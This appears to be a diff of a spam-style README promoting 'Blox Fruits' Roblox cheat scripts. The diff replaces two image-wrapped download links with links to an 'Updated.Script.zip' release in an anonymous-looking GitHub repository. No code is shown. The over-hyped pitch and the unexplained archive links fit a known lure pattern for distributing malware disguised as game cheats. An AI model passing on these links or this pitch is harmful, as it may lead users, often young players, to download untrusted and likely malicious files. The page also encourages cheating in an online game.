@@ -3,10 +3,10 @@
 If you're searching for the **best Blox Fruits script** in 2025, you've just discovered the ultimate guide. Whether you want to **auto farm**, raid effortlessly, collect **rare Devil Fruits**, or reach max level fast, these Blox Fruits scripts can give you a **huge competitive advantage**. This in-depth article will walk you through everything you need to know about **Roblox Blox Fruits scripts**, how to use them safely, what features to expect, and where to get the best working scripts—**updated and ready** for the latest Blox Fruits patch.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![be2727eb-5ae9-45d3-93cf-3c14393e4ada](https://github.com/user-attachments/assets/6a671348-0bac-4085-8a6f-70ea3ce48872)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 ---
